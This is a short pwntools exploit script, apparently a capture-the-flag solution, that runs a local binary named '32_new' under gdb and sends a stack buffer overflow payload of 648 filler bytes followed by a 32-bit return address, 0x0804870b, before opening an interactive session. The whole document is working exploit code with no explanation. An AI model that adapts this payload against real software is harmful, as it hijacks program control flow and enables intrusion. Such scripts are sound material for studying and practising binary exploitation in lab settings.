from pwn import *

target = process("./32_new")
gdb.attach(target, api = 'true')

payload = b"a"*648 + p32(0x0804870b)

target.sendline(payload)
target.interactive()